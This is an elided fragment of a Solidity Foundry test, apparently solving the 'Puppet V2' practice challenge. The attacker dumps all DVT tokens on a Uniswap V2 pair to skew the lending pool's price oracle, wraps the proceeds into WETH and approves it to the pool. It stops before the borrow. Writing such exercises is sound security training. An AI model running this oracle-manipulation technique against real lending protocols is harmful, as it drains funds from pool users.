...
contract PuppetV2 is Test {
    ...
    function testExploit() public {
        ...
        emit log_named_uint("attacker ETHs", attacker.balance / 1e18);
        emit log_named_uint("attacker WETH", weth.balanceOf(attacker) / 1e18);
        ...
        uint256[] memory tokens =
            uniswapV2Router.swapExactTokensForETH(dvt.balanceOf(attacker), 1, path, attacker, block.timestamp + 5 days);
        emit log_named_uint("tokens length", tokens.length);
        emit log_named_uint("tokens[0]", tokens[0] / 1e18);
        emit log_named_uint("tokens[1]", tokens[1] / 1e18);
        emit log_named_uint("tokens length", tokens.length);
        weth.deposit{value: attacker.balance}();
        emit log_named_uint("attacker DVTs", dvt.balanceOf(attacker) / 1e18);
        emit log_named_uint("attacker ETHs", attacker.balance / 1e18);
        emit log_named_uint("attacker WETH", weth.balanceOf(attacker) / 1e18);
        emit log_named_uint(
            "required WETH", puppetV2Pool.calculateDepositOfWETHRequired(dvt.balanceOf(address(puppetV2Pool))) / 1e18
        );
        emit log_named_uint("attacker WETH full", weth.balanceOf(attacker));
        emit log_named_uint(
            "required WETH full", puppetV2Pool.calculateDepositOfWETHRequired(dvt.balanceOf(address(puppetV2Pool)))
        );
        weth.approve(address(puppetV2Pool), dvt.balanceOf(address(puppetV2Pool)));
